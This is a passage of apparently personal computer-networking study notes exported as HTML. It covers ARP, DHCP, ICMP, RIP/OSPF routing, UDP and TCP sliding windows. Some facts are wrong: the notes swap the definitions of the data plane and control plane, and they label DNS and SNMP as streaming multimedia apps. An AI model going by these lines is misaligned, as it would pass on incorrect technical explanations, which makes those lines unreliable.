class="image"><a href="Untitled%2037.png"><img style="width:568.125px" src="Untitled%2037.png"/></a></figure><ul id="11f1a926-7344-80e8-bc31-d93ef48c463e" class="bulleted-list"><li style="list-style-type:disc">now represented as hex instead of binary</li></ul><ul id="11f1a926-7344-80a2-9459-f6fc0ee57687" class="bulleted-list"><li style="list-style-type:disc">:: means 0000 in between</li></ul><ul id="11f1a926-7344-8093-93f3-f0666859ab38" class="bulleted-list"><li style="list-style-type:disc">now 128 bits instead of 32 bits</li></ul><ul id="11f1a926-7344-805d-992f-fb910c9c9ed3" class="bulleted-list"><li style="list-style-type:disc">adds more features</li></ul></div></figure></details></li></ul><ul id="11f1a926-7344-80a3-a799-e459cc414a35" class="toggle"><li><details><summary>IP Forwarding (longest prefix match method)</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1201a926-7344-8035-b217-ca8ed5aa8022"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="0e279bb5-d975-4ade-989f-bc1c8b793418" class="">routers will forward IP’s that have the longest matching prefix in the forwarding table</p><figure id="1201a926-7344-80ec-a184-e9baa3e7e1cb" class="image"><a href="Untitled%2038.png"><img style="width:652px" src="Untitled%2038.png"/></a><figcaption>11001000 00010111 000<mark class="highlight-yellow_background">10</mark>110 10100001 is forwarded to interface 0 <br/>11001000 00010111 000<br/><mark class="highlight-yellow_background">11000</mark> 10101010 is forwarded to interface 1</figcaption></figure></div></figure><h3 id="1201a926-7344-8018-bed7-e693fdb260b3" class="">ISP Advertisement</h3><p id="1201a926-7344-8042-adb2-fa44cf9a778c" class="">longest prefix match method allows originations to switch to a different ISP and keep their IP address the same</p><figure id="1201a926-7344-80e3-8c12-dfe6dd7103a0" class="image"><a href="Untitled%2039.png"><img style="width:595.96875px" src="Untitled%2039.png"/></a></figure><figure id="1201a926-7344-8070-9439-e023d1794b23" class="image"><a href="Untitled%2040.png"><img style="width:595.96875px" src="Untitled%2040.png"/></a></figure></details></li></ul><ul id="11f1a926-7344-8095-a099-e07eef19fe12" class="toggle"><li><details><summary>Address Resolution Protocol (ARP)</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1201a926-7344-80d8-b8c7-e637ccf72bd8"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="521a10bf-5171-40e9-b819-e3adfa2b93d9" class="">a protocol that translates IP address to L2 addresses within a network using an temporary ARP cache/table</p><ol type="1" id="1201a926-7344-8066-8894-cb24e5f359c4" class="numbered-list" start="1"><li>check if IP to L2 address is cached and use it</li></ol><ol type="1" id="1201a926-7344-8004-ba1d-f177c96f061f" class="numbered-list" start="2"><li>if not, broadcast an ARP query on the network<figure id="1201a926-7344-8093-809f-c65006b350c1" class="image"><a href="Untitled%2041.png"><img style="width:652px" src="Untitled%2041.png"/></a></figure></li></ol><ol type="1" id="1201a926-7344-80c4-b4ab-f6b77af5907e" class="numbered-list" start="3"><li>each host receives a query and responds if its IP address matches<figure id="1201a926-7344-80a3-a281-d342bd7d022f" class="image"><a href="Untitled%2042.png"><img style="width:652px" src="Untitled%2042.png"/></a></figure></li></ol><ol type="1" id="1201a926-7344-809a-945f-fc84360eeeae" class="numbered-list" start="4"><li>originator adds the IP → MAC address to its ARP cache/table<figure id="1201a926-7344-80ab-ab54-ea51258e39d7" class="image"><a href="Untitled%2043.png"><img style="width:595.96875px" src="Untitled%2043.png"/></a></figure></li></ol></div></figure></details></li></ul><ul id="11f1a926-7344-8044-b262-fb7172ce2dd6" class="toggle"><li><details><summary>Dynamic Host Configuration Protocol (DHCP)</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1201a926-7344-80c6-9412-dc6097c85ec5"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="6c789cb8-f73f-4855-b358-416c4ae57668" class="">for a node to join a LAN, local gateway uses DHCP to lease IP addresses</p><ol type="1" id="1211a926-7344-8026-a711-eefd6c2330aa" class="numbered-list" start="1"><li>DHCP Discovery: Client broadcasts to find a DHCP server</li></ol><ol type="1" id="1211a926-7344-8006-ba35-da570160286e" class="numbered-list" start="2"><li>DHCP Offer: DHCP server responds with an offer the client can use</li></ol><ol type="1" id="1211a926-7344-802c-b5c0-c560b0506109" class="numbered-list" start="3"><li>DHCP Request: Client responds back that they will use it</li></ol><ol type="1" id="1211a926-7344-80e4-8821-f18c95686c70" class="numbered-list" start="4"><li>DHCP Acknowledgement: DHCP sets the registry and sends back an ACK   </li></ol><figure id="1211a926-7344-808e-abc1-e25ca518f18a" class="image"><a href="Untitled%2044.png"><img style="width:652px" src="Untitled%2044.png"/></a></figure></div></figure><h3 id="1211a926-7344-8009-92f5-c28da62e8a12" class="">Example</h3><ol type="1" id="1201a926-7344-8043-8e83-d2ba73b1fd52" class="numbered-list" start="1"><li>client wants to join LAN, it broadcasts “is there a DHCP server out there?”</li></ol><figure id="1201a926-7344-80b6-bd0c-ef32f56ac3eb" class="image"><a href="Untitled%2045.png"><img style="width:596.10791015625px" src="Untitled%2045.png"/></a></figure><ol type="1" id="1201a926-7344-8055-843c-cecdd82af462" class="numbered-list" start="2"><li>DHCP server gets the request</li></ol><figure id="1201a926-7344-801c-9fc7-f3443e552e8f" class="image"><a href="Untitled%2046.png"><img style="width:652px" src="Untitled%2046.png"/></a></figure><ol type="1" id="1201a926-7344-800d-b51c-fe061d793f88" class="numbered-list" start="3"><li>DHCP responds with an IP address the client can use </li></ol><figure id="1201a926-7344-80c7-a0d7-e2b6a0b7bb4b" class="image"><a href="Untitled%2047.png"><img style="width:596.09375px" src="Untitled%2047.png"/></a></figure><ol type="1" id="1201a926-7344-8017-a7eb-ed08a5cf048d" class="numbered-list" start="4"><li>client is now joined apart of the LAN and uses the leased IP address</li></ol><figure id="1201a926-7344-807a-a385-e49692a88d0d" class="image"><a href="Untitled%2048.png"><img style="width:596.09375px" src="Untitled%2048.png"/></a></figure><ol type="1" id="1201a926-7344-805d-816d-ff65e2db6a7b" class="numbered-list" start="5"><li>this is for a new client who haven’t had a lease before,<p id="e674324c-4146-4816-97c0-1c7a8acee554" class="">if you’re not new then all you have to do is renew your lease</p></li></ol><figure id="1201a926-7344-80f8-ab10-cec7ab94fdb6" class="image"><a href="Untitled%2049.png"><img style="width:652px" src="Untitled%2049.png"/></a></figure><ol type="1" id="1201a926-7344-80f6-a907-fa457dfc1850" class="numbered-list" start="6"><li>client confirms that its happy to use this IP address to the DHCP server</li></ol><figure id="1201a926-7344-805c-88f9-e25d692b54d3" class="image"><a href="Untitled%2050.png"><img style="width:652px" src="Untitled%2050.png"/></a></figure><figure id="1201a926-7344-8051-bfe3-ce0de96727e0" class="image"><a href="Untitled%2051.png"><img style="width:596.1221313476562px" src="Untitled%2051.png"/></a></figure><ol type="1" id="1201a926-7344-8069-8dca-de5ddc16928b" class="numbered-list" start="7"><li>DHCP server gives confermation</li></ol><figure id="1201a926-7344-80fb-90af-ce936691daa7" class="image"><a href="Untitled%2052.png"><img style="width:596.10791015625px" src="Untitled%2052.png"/></a></figure><figure id="1201a926-7344-80f1-9488-d86f30d09be7" class="image"><a href="Untitled%2044.png"><img style="width:652px" src="Untitled%2044.png"/></a></figure></details></li></ul><ul id="11f1a926-7344-80fc-a3b7-f650de293d27" class="toggle"><li><details><summary>Internet Control Message Protocol (ICMP)</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1201a926-7344-805a-8cfa-f0e2f9daa12e"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="139d3153-9022-4013-a192-36201d47e295" class="">messaging protocol for IP to send back to the source host when a router   cannot process an IP datagram successfully</p><ul id="1201a926-7344-8071-8138-f7ddb5049db0" class="bulleted-list"><li style="list-style-type:disc">eg: &quot;destination host unreachable,&quot; &quot;TTL reached zero”</li></ul></div></figure><h3 id="1201a926-7344-8020-894d-c0b8cb46355e" class="">ping</h3><p id="1201a926-7344-803c-bc4c-d03f618ca5b4" class="">network utility tool to test reachability/responsiveness  of a node </p><p id="1201a926-7344-80dd-b21e-f7c5332681b8" class="">uses ICMP to send back the response</p><h3 id="1201a926-7344-8040-9d60-e16648d1b4e8" class="">traceroute</h3><p id="1201a926-7344-80aa-a82c-c725aa62453b" class="">tool used to trace a route from source to dest by sending a series of packets with incremental TTL</p><p id="1201a926-7344-80ac-910e-c00a43ada030" class="">ICMP is sent back to the source when TTL expires</p></details></li></ul></details></li></ul><ul id="11f1a926-7344-80ab-a7c8-d4a302a7c0c9" class="toggle"><li><details><summary>Routing Protocol</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1201a926-7344-8067-adc2-dccf4d25774d"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="50d951b3-73bc-4e98-8f1d-411cff576068" class="">routing protocol is the <mark class="highlight-yellow">process of constructing forwarding tables for routers</mark><br/>algorithms such as RIP and OSPF are used for internal domains<br/></p></div></figure><h3 id="1211a926-7344-8070-a486-e5ada29508fb" class="">Forwarding vs Routing</h3><table id="1211a926-7344-8037-93af-ed2037e884c5" class="simple-table"><tbody><tr id="d1cc4ea3-445d-4859-a648-2c0695559f68"><td id="g?j?" class="">Forwarding</td><td id="lDsz" class="">Routing</td></tr><tr id="c46e5bd2-4951-4a39-b05b-e6c110d769e7"><td id="g?j?" class="">directing a packet towards its destination to the next router/interface using the forwarding table</td><td id="lDsz" class="">process of constructing forwarding tables AKA control planes using algorithms</td></tr></tbody></table><h3 id="1211a926-7344-8073-b0d7-dfddfbd5cedc" class="">Data plane vs Control plane</h3><p id="1211a926-7344-809b-8997-ff9a882c36c7" class="">control plane forwards packets using tables</p><p id="1211a926-7344-80ac-90b6-d6ae76e54983" class="">data plane constructs the forwarding tables by talking to other routers based on an algorithm</p><figure id="1211a926-7344-803d-9d2e-c65a2ed0520b" class="image"><a href="image%2031.png"><img style="width:596.10791015625px" src="image%2031.png"/></a></figure><h3 id="1211a926-7344-8032-b880-ce3ec27fc412" class="">RIP Algorithm &amp; Distance Vector </h3><ul id="1211a926-7344-80ba-a506-f492be18e50a" class="toggle"><li><details><summary>Bellman-Ford</summary><h3 id="988901b9-146f-4d32-b56c-72378d02c637" class="">Idea 1: Distance vector algorithm (a.k.a. Bellman-Ford).</h3><p id="5fdb4d90-c99e-45d5-bb4e-47e6ae85a798" class="">we want to find the shortest distance between any pair of nodes in our graph</p><ul id="b0951231-f432-4a36-8e40-69808429bcab" class="bulleted-list"><li style="list-style-type:disc">each node/router constructs a <mark class="highlight-yellow_background">1d array containing distance/cost to all other nodes</mark> and share it to its immediate neighbours</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7f834668-56e4-48a8-a16d-22b6f349bfc2" class="code"><code class="language-Java">//for each iteration

		//each node calculates a new distance candidate for each node 
			//if it goes via another node
		
		//if the new distance estimate is smaller than the current distance”
				//update its table
				//and then again share it with its immediate neighbours
		
//Eventually each node will converge to its shortest path to all other nodes</code></pre><h3 id="2d366906-2ef3-4de2-973c-bce6ee833497" class="">Network as a Graph: An example</h3><figure id="93396242-6e5c-416a-a25a-9651bd34ee0c" class="image"><a href="Untitled%2053.png"><img style="width:651.96875px" src="Untitled%2053.png"/></a></figure><h3 id="bb98884f-4276-4e4a-9112-3b186bc99d3a" class="">Distance vector: Example</h3><p id="dab1384e-87b3-46d1-a3bd-5fecc91fe271" class="">first iteration</p><figure id="4b8161b1-6efb-47ae-8e8a-eeb4a3d79796" class="image"><a href="Untitled%2054.png"><img style="width:463.9772644042969px" src="Untitled%2054.png"/></a></figure><p id="1784076d-ad7e-4d9e-806b-bb1c936d9274" class="">complete vector of shortest distances for a</p><figure id="8f3bea21-82ac-46a8-8b57-7c759a5a19f4" class="image"><a href="Untitled%2055.png"><img style="width:651.96875px" src="Untitled%2055.png"/></a></figure><p id="92cbda44-4968-4130-a93d-a029bbab8f51" class="">now for c</p><figure id="e4c4c9b7-be0e-470c-b4fd-7eabf1546f67" class="image"><a href="Untitled%2056.png"><img style="width:485.96588134765625px" src="Untitled%2056.png"/></a></figure><p id="f285fa0b-9dd5-4c22-aa77-dbdfa878555f" class="">after one round of updates.</p><figure id="055def4b-5d80-4766-bad4-3b8f7800382f" class="image"><a href="Untitled%2057.png"><img style="width:651.984375px" src="Untitled%2057.png"/></a></figure><p id="6ed95734-e05e-4846-a19b-edeb1c6bf331" class="">completed for c</p><figure id="e70c0cd0-b07c-4698-b8ab-8eae8b200507" class="image"><a href="Untitled%2058.png"><img style="width:567.96875px" src="Untitled%2058.png"/></a></figure><ul id="853caa25-bed6-42e5-b56f-12ee373eea5f" class="bulleted-list"><li style="list-style-type:disc">problem with all the algorithms is that they cannot scale to the whole internet</li></ul></details></li></ul><ul id="1211a926-7344-802a-9c1a-edaacb5d7c09" class="toggle"><li><details><summary>circumstances node sends a routing update</summary><figure id="b192831a-fa93-4972-b409-e754309fb6f1" class="image"><a href="Untitled%2059.png"><img style="width:567.984375px" src="Untitled%2059.png"/></a></figure></details></li></ul><ul id="1211a926-7344-80e7-828d-d5cd94551ea0" class="toggle"><li><details><summary>Response to link failures</summary><ul id="fdfd0116-e57b-4840-bcd3-e879edb2db3e" class="bulleted-list"><li style="list-style-type:disc">Let&#x27;s say E is unreachable now</li></ul><ul id="7261d4bd-4e41-40ea-b2b4-457ff9dfd356" class="bulleted-list"><li style="list-style-type:disc">A makes their distance to E infinite to show that E is now dead</li></ul><ul id="d767816c-2818-446e-b427-8b00d113803b" class="bulleted-list"><li style="list-style-type:disc">The rest of the nodes trying to get to E have outdated distances, so if they try to get to E then:<ul id="ec83b8ec-f7bf-48fb-85af-078c988a149f" class="bulleted-list"><li style="list-style-type:circle">They will try to update</li></ul><ul id="061dd562-ac1e-4ec1-8a76-7695662b0259" class="bulleted-list"><li style="list-style-type:circle">Because the distance to E is infinite, they will keep updating</li></ul><ul id="6f2a33b6-2162-409c-be13-4e698ebe65e6" class="bulleted-list"><li style="list-style-type:circle">This causes them to be stuck in an infinite loop</li></ul></li></ul><ul id="e20172ef-253e-40d9-b7bc-9cd8e8bde2a7" class="bulleted-list"><li style="list-style-type:disc">We can prevent this by setting a limit to how far a node could travel</li></ul><ul id="85474d91-cf49-4f95-9497-d6ddc4f44e3c" class="bulleted-list"><li style="list-style-type:disc">However, there are better algorithms that don’t have this problem</li></ul><figure id="cf54726b-a997-4d8b-99e7-afb62476fe21" class="image"><a href="Untitled%2060.png"><img style="width:623.984375px" src="Untitled%2060.png"/></a></figure><figure id="925ebde1-6f40-49f7-ba58-dd9d08062c47" class="image"><a href="Untitled%2061.png"><img style="width:623.984375px" src="Untitled%2061.png"/></a></figure><figure id="e6078fa5-6880-46cf-814d-010afec2b707" class="image"><a href="Untitled%2062.png"><img style="width:623.96875px" src="Untitled%2062.png"/></a></figure></details></li></ul><h3 id="1211a926-7344-801b-94ae-e63dc7dec1d2" class="">OSPF Algorithm &amp; Link State</h3><ul id="1211a926-7344-8007-b6a3-f1e6b9a452c5" class="toggle"><li><details><summary>Dijkstra</summary><h3 id="6b91f195-4ffa-45cd-88ce-f08f833ebe32" class="">Idea 2: Link State Routing (a.k.a. Dijkstra)</h3><ul id="f30898f7-5ed8-4da0-aaaf-0515e2499211" class="bulleted-list"><li style="list-style-type:disc">each node/router is able of finding out the state of the link to its neighbours and cost of each link</li></ul><ul id="0d4adc0c-17f9-4a32-9395-1076c6c674cd" class="bulleted-list"><li style="list-style-type:disc">allows it to get a view of the whole graph</li></ul><ul id="7fa7cd74-23ff-4fa3-a365-318d37bcee5f" class="bulleted-list"><li style="list-style-type:disc">Every node knows how to reach its directly connected neighbours: disseminated this information to every node! Then every node will be able to build a complete map of the network</li></ul><p id="9d84d05a-9928-4706-a335-550f236fea0d" class="">So two mechanisms involved:</p><ul id="71e6bc90-e1f1-4991-904f-0083d1f0130b" class="bulleted-list"><li style="list-style-type:disc">reliable dissemination of link-state information, and</li></ul><ul id="f3400ca5-347a-412e-be38-8ab84946d742" class="bulleted-list"><li style="list-style-type:disc">calculation of routes from the aggregation of all the accumulated link-state knowledge</li></ul></details></li></ul><ul id="1211a926-7344-805a-9e96-e214c7a54b0b" class="toggle"><li><details><summary>Reliable Flooding</summary><figure id="10cf41ff-3d40-44f5-ac4a-8ca8a3c5d9f3" class="image"><a href="Untitled%2063.png"><img style="width:801px" src="Untitled%2063.png"/></a></figure><figure id="c47ac456-66a5-4c2d-9e75-cde959edd925" class="image"><a href="Untitled%2064.png"><img style="width:854px" src="Untitled%2064.png"/></a></figure></details></li></ul><ul id="1211a926-7344-8061-a9c5-c37293a4e0d8" class="toggle"><li><details><summary>Route calculation</summary><figure id="3fd3f804-f0bd-450f-b2fc-578bc1bf522c" class="image"><a href="Untitled%2065.png"><img style="width:819px" src="Untitled%2065.png"/></a></figure><figure id="728ace5c-a688-4066-b222-438d78a2dbbf" class="image"><a href="Untitled%2066.png"><img style="width:623.984375px" src="Untitled%2066.png"/></a></figure><figure id="8336ab8c-4f08-4162-a17c-01481f836ff6" class="image"><a href="Untitled%2067.png"><img style="width:838px" src="Untitled%2067.png"/></a></figure></details></li></ul><h3 id="1211a926-7344-8034-9d42-e985632f7dc3" class="">Routing Area</h3><p id="1211a926-7344-8032-a88e-dbaf096aaaf0" class="">Routing areas are partitioned routing domains that address the scalability and provider bias issues of the OSPF algorithm. </p><ul id="1211a926-7344-80c0-be54-eacba3b31d36" class="bulleted-list"><li style="list-style-type:disc">Routing area is a set of routers to exchange link state with other areas</li></ul><ul id="1211a926-7344-804e-9f19-f3948f8ed18e" class="bulleted-list"><li style="list-style-type:disc">Area 0/Backbones are special routers that is both a member of backbone area and non-backbone area</li></ul><ul id="1211a926-7344-8001-85b6-d4bddfcc09f7" class="bulleted-list"><li style="list-style-type:disc">each area runs the OSPF operation but only floods/searches within itself</li></ul><ul id="1211a926-7344-80de-b697-e6610083510f" class="bulleted-list"><li style="list-style-type:disc">this is not the best/optimal solution but it actually works and is scalable to the whole web </li></ul><figure id="1211a926-7344-8033-85dd-ca160ec92e17" class="image"><a href="Untitled%2068.png"><img style="width:589.984375px" src="Untitled%2068.png"/></a></figure></details></li></ul></details></li></ul><ul id="11e1a926-7344-80c7-bb37-de2825a69f89" class="toggle"><li><details><summary>Transport Layer (L4)</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1201a926-7344-8005-b23e-d06ebccc8946"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="2e81d4dc-d297-4dc5-b1e8-637831c38905" class="">transport layer <mark class="highlight-yellow">provides protocols to communicate between applications</mark> on end hosts</p><ul id="1201a926-7344-804e-92f1-c7ec6ae8d048" class="bulleted-list"><li style="list-style-type:disc">end-to-end communication: 2 nodes connected directly</li></ul><ul id="1201a926-7344-8062-a1e2-f25b0ee50643" class="bulleted-list"><li style="list-style-type:disc">layer 4 must work with the limitations of IP’s best effort model<p id="1201a926-7344-807f-a124-dbba2ce24012" class="">(eg: packet drop, out of order delivery, duplicate packets, corrupted packets, limited packets, packet delay)</p></li></ul></div></figure><ul id="1201a926-7344-8051-abcf-c644dae9971b" class="toggle"><li><details><summary>UDP (User Datagram Protocol)</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1201a926-7344-809b-b1be-d395d31de168"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="d9758081-ce69-438a-b76f-fe36d18ec195" class="">transport protocol to send datagrams without an established connection</p><ul id="1201a926-7344-80a1-a1bd-e407c5070296" class="bulleted-list"><li style="list-style-type:disc">fast and simple with no overhead</li></ul><ul id="1201a926-7344-80c6-a936-c0064651530d" class="bulleted-list"><li style="list-style-type:disc">great for streaming multimedia apps (DNS, SNMP)</li></ul><ul id="1201a926-7344-8005-9214-cdbfccc2e985" class="bulleted-list"><li style="list-style-type:disc">reliability is handled by the application layer </li></ul><table id="1201a926-7344-80e3-9755-cd6b2144a686" class="simple-table"><tbody><tr id="8d34ce41-0db7-4770-b26f-157920dead2c"><td id="P_fQ" class="">good</td><td id="vpRa" class="">bad</td></tr><tr id="d37bc393-d888-429e-9210-ffbbfa2848a9"><td id="P_fQ" class="">low latency and loss-tolerating transmissions</td><td id="vpRa" class="">no guaranteed delivery</td></tr><tr id="c48d04d1-436f-415b-8422-4780ecbac38c"><td id="P_fQ" class="">only supports multiple application process on end hosts</td><td id="vpRa" class="">out of order delivery</td></tr><tr id="1201a926-7344-80a1-b4af-c2400740a821"><td id="P_fQ" class="">is connection-less: no handshake and datagrams are handled independently</td><td id="vpRa" class="">may send duplicate packets</td></tr><tr id="1201a926-7344-8065-a065-f749848092be"><td id="P_fQ" class=""></td><td id="vpRa" class="">packet size are fixed and must be chopped up</td></tr><tr id="1201a926-7344-8052-951b-d5f4e3a2da2b"><td id="P_fQ" class=""></td><td id="vpRa" class="">sender and receiver are not synchronized</td></tr><tr id="1201a926-7344-8086-94b9-d3d18071043f"><td id="P_fQ" class=""></td><td id="vpRa" class="">no control flow</td></tr><tr id="1201a926-7344-8034-a5de-de0535324e7a"><td id="P_fQ" class=""></td><td id="vpRa" class="">no security</td></tr></tbody></table></div></figure><h3 id="1201a926-7344-8098-b687-e41f0a92c09c" class="">Multiplexing Demultiplexing Problem</h3><p id="1201a926-7344-802a-8b8a-ff99fdccfc9e" class="">because UDP is connectionless, we don’t know which packet is coming from where when MUXing and DeMUXing</p><figure id="1201a926-7344-80e0-b818-cf7c2cfb214d" class="image"><a href="Untitled%2069.png"><img style="width:192px" src="Untitled%2069.png"/></a></figure><figure id="1201a926-7344-805d-8af9-c327b22cc5d9" class="image"><a href="Untitled%2070.png"><img style="width:192px" src="Untitled%2070.png"/></a></figure><h3 id="1201a926-7344-8098-9ca7-fdf8b3b2574c" class="">Multiplexing and Demultiplexing: Port Numbers</h3><p id="1201a926-7344-802d-9926-f57304cfed70" class="">UDP headers contain keys/application identifiers called “port numbers” to differentiate which packet is coming from which application/host</p><ul id="1201a926-7344-8084-97a5-c278affefdbe" class="bulleted-list"><li style="list-style-type:disc">destination port numbers have to be known by the client (eg: if we’re accessing an HTTPS site, its well known that it uses port 443)</li></ul><figure id="1201a926-7344-80e7-b1ba-c9c363627832" class="image"><a href="image%2032.png"><img style="width:559.9715576171875px" src="image%2032.png"/></a></figure><figure id="1201a926-7344-80ae-839a-d207d4ccd6bd" class="image"><a href="Untitled%2071.png"><img style="width:595.984375px" src="Untitled%2071.png"/></a></figure></details></li></ul><ul id="1201a926-7344-8031-b5ac-c27ae5192377" class="toggle"><li><details><summary>TCP (Transmission Control Protocol</summary><figure class="block-color-default callout" style="white-space:pre-wrap;display:flex" id="1201a926-7344-80be-83c6-ff0d012a9b27"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%"><p id="71649880-b6e9-466b-a442-657e452783b8" class=""><mark class="highlight-yellow">connection oriented</mark> transfer protocol that <mark class="highlight-yellow">provides everything UDP doesn’t</mark></p><ul id="1271a926-7344-8049-b66e-f81ae582fb6e" class="bulleted-list"><li style="list-style-type:disc">is stateful: stream connection stores bytes as state</li></ul><ul id="1201a926-7344-80a8-bbae-cd8f7fbf27d4" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">byte oriented:</mark> sender writes bytes into a stream, receiver reads bytes out the stream</li></ul><ul id="1201a926-7344-80e4-a4b8-d6292717803e" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">guaranteed delivery </mark></li></ul><ul id="1201a926-7344-8058-bacc-eb9fa15825df" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">in order</mark> delivery stream</li></ul><ul id="1201a926-7344-80f8-b8a6-ce00a56fa11c" class="bulleted-list"><li style="list-style-type:disc"><mark class="highlight-yellow">full-duplex </mark>protocol: supports <mark class="highlight-yellow">bi directional byte streams</mark></li></ul><ul id="1201a926-7344-8056-9ac6-f9ef137f8c19" class="bulleted-list"><li style="list-style-type:disc">has <mark class="highlight-yellow">flow control:</mark> allowing receiver to <mark class="highlight-yellow">limit amount of data</mark> transmitted by the sender at a given time</li></ul><ul id="1201a926-7344-80fa-b697-c34f5a79afdd" class="bulleted-list"><li style="list-style-type:disc">implements a <mark class="highlight-yellow">congestion-control</mark>:<mark class="highlight-yellow"> prevents sender from overloading</mark> the network</li></ul><figure id="1201a926-7344-808a-a481-de3f8f481edc" class="image"><a href="8a8e1a6e-5948-4516-9ec9-35be02e582df.png"><img style="width:588.4069097888676px" src="8a8e1a6e-5948-4516-9ec9-35be02e582df.png"/></a></figure></div></figure><h3 id="1201a926-7344-8050-91f3-da30e0fff92f" class="">Socket API</h3><p id="1201a926-7344-80e9-b5fd-e72e60c4ac61" class="">programming interface for socket operations</p><ul id="1201a926-7344-8041-bab8-de3bac40cf89" class="bulleted-list"><li style="list-style-type:disc">server side <mark class="highlight-yellow">passive operations</mark>: <mark class="highlight-yellow"><mark class="highlight-yellow_background">accepts but doesn’t establish connection</mark></mark> (<mark class="highlight-gray"><code>bind</code></mark>, <mark class="highlight-gray"><code>listen</code></mark>, <mark class="highlight-gray"><code>accept</code></mark>)</li></ul><ul id="1201a926-7344-80be-bd8c-d98e7b6f1e13" class="bulleted-list"><li style="list-style-type:disc">client side <mark class="highlight-yellow">active operations</mark>: <mark class="highlight-yellow"><mark class="highlight-yellow_background">operation doesn’t return until TCP establishes connection</mark></mark> (<mark class="highlight-gray"><code>connect</code></mark>)</li></ul><ul id="1201a926-7344-806d-80e9-df955164ce48" class="bulleted-list"><li style="list-style-type:disc">once server and client is connected (<mark class="highlight-gray"><code>send</code></mark>, <mark class="highlight-gray"><code>receive</code></mark>)</li></ul><h3 id="1201a926-7344-80d2-8ec9-f287a750f1e7" class="">Stop-and-Wait ARQ</h3><p id="1201a926-7344-8007-a8ff-c91631cd0283" class="">TCP gets around IP unreliably with acknowledgements and timeouts.</p><p id="1201a926-7344-807b-b373-c0e4eaaa247b" class=""><mark class="highlight-yellow">after transmission, sender waits for an acknowledgement</mark> before the next transmission</p><p id="1201a926-7344-8037-973c-fd05e2b60d95" class="">drawback of wait-and-stop is that there can only be one frame that isn’t acknowledged</p><p id="1201a926-7344-8026-af9e-f40797a266b9" class="">to get around this, use a sliding window</p><ul id="1201a926-7344-802c-9813-ef764f18ef65" class="bulleted-list"><li style="list-style-type:disc">if frame is sent successfully, ARK is returned<figure id="ab28c348-2f0f-4779-87a8-bc55f01c1998" class="image"><a href="Untitled%2072.png"><img style="width:288px" src="Untitled%2072.png"/></a></figure></li></ul><ul id="1201a926-7344-80bb-bd0f-e8385e699f86" class="bulleted-list"><li style="list-style-type:disc">if frame is not delivered, ARK is not sent, so the sender knows to send it again<figure id="fcabae9a-d7c9-4a65-b9a9-bef491ad6db9" class="image"><a href="Untitled%2073.png"><img style="width:288px" src="Untitled%2073.png"/></a></figure></li></ul><ul id="1201a926-7344-8049-911b-e83e3620b93b" class="bulleted-list"><li style="list-style-type:disc">however the ARK could be lost as well<figure id="936b9de6-326a-4b30-a9c6-9fcbf41f5166" class="image"><a href="Untitled%2074.png"><img style="width:288px" src="Untitled%2074.png"/></a></figure></li></ul><ul id="1201a926-7344-8095-813d-d3b9a54581ab" class="bulleted-list"><li style="list-style-type:disc">ARC could also be late<figure id="1bedb9fa-45d9-4a2c-bee5-886dd278f406" class="image"><a href="Untitled%2075.png"><img style="width:288px" src="Untitled%2075.png"/></a></figure></li></ul><ul id="1201a926-7344-809c-8b0e-f461a959aa84" class="bulleted-list"><li style="list-style-type:disc">a good part of this is that each identifier is just 1 bit<figure id="a3c14f15-68af-443f-ba68-c0f53bfed844" class="image"><a href="Untitled%2076.png"><img style="width:288px" src="Untitled%2076.png"/></a></figure></li></ul><h3 id="1201a926-7344-8006-8392-de439db014ac" class="">Sliding Window</h3><p id="1201a926-7344-80d7-ac52-fb797c5dd850" class="">instead of only allowing 1 outstanding frame, we can have multiple in a queue up to allow n number of outstanding frames</p><ul id="1201a926-7344-8072-9047-f91164aa7aa5" class="bulleted-list"><li style="list-style-type:disc">when ACK is received, window slides to allow more frames to be sent</li></ul><ul id="1201a926-7344-80b6-a377-e358bead17f3" class="bulleted-list"><li style="list-style-type:disc">outstanding frames outside of the window will be sent once their in the window</li></ul><figure id="1201a926-7344-809e-b558-e691079fdf95" class="image"><a href="image%2033.png"><img style="width:542.9545288085938px" src="image%2033.png"/></a></figure><ul id="1201a926-7344-8034-874c-ec415fc5a924" class="bulleted-list"><li style="list-style-type:disc">TCP is bi-directional, so there is a sent and received buffer that has sliding windows</li></ul><ul id="1201a926-7344-80a6-a63f-e6b2a559afb8" class="bulleted-list"><li style="list-style-type:disc">size of sliding window is advertised by the <code>AdvertisedWindow </code>field in the TCP header </li></ul><figure id="1201a926-7344-80be-9622-c1126c450559" class="image"><a href="image%2034.png"><img style="width:624.0625px" src="image%2034.png"/></a></figure><h3 id="1201a926-7344-8089-9913-ec508ef14228" class="">Sequence Number and Acknowledgement</h3><p id="1201a926-7344-8069-a1b6-ddefdf6fe900" class="">TCP header contains a SequenceNum and ACK identifier </p><p id="1201a926-7344-80ed-a017-ea1316bd36bb" class="">SequenceNum 